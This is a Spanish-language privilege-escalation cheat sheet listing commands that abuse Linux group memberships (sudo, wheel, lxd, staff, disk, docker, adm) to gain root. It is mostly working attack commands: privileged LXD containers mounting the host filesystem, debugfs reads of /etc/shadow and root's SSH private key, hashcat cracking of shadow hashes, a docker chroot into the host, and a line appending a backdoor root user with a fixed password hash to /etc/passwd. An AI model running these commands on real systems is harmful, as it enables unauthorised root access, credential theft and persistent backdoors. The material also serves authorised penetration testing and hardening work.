Grupos vulnerables

La pertenencia a estos grupos no siempre implica escalada directa, pero sí aumenta mucho la superficie de abuso. Confirmar permisos efectivos, configuración local y contexto antes de asumir impacto.

Sudo / Admin

Obtener shell con sudo o lanzar comandos con pkexec

sudo su
pkexec "/bin/sh"

Wheel

Obtener shell con sudo conociendo las credenciales del usuario actual

sudo su
pkexec "/bin/sh"

LXD / LXC

LXD es similar a Docker. Si el usuario puede administrar LXD/LXC, puede crear un contenedor privilegiado y montar el filesystem del host para leer o modificar archivos sensibles.

Iniciar daemon

lxd init

Importar la imagen local con el alias ubuntutemp

lxc image import <imag.tar> --alias <imag_name>
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list

Iniciar la imagen ubuntutemp en el contenedor con alias privesc y con privilegios

lxc init <imag_name> <container_name> -c security.privileged=true
lxc init ubuntutemp privesc -c security.privileged=true

Montar el filesystem del host

lxc config device add <container_name> <device_name> disk source=/ path=/mnt/root recursive=true
lxc config device add privesc host disk source=/ path=/mnt/root recursive=true

Arrancar el contenedor y obtener shell

lxc start privesc
lxc exec privesc /bin/sh

Staff

Permisos en /usr/local

ls -l /usr/local/bin # Aprovechar posibles Path Hijacking

Disk

Un usuario del grupo disk puede acceder directamente a dispositivos de bloque. Con herramientas como debugfs podría leer archivos sensibles del sistema, como /etc/shadow o claves privadas.

Entrar en debugfs en la partición

# Para entrar en debugfs en la partición
debugfs /dev/sda1

# Podemos ver ficheros interesantes
debugfs: cat /etc/shadow
debugfs: cat /root/.ssh/id_rsa

Cracking Shadow

hashcat -m 1800 shadow rockyou.txt

Docker

Un usuario con control sobre Docker puede montar el sistema de archivos del host dentro de un contenedor y modificarlo como root, salvo que existan restricciones adicionales.

Docker

# Listar imágenes de docker
docker image

# Shell en docker con el sistema de ficheros host montado
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash

# Añadir nuevo root
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

ADM

Permite leer /var/log

# Aplica para log poisoning
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"

grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
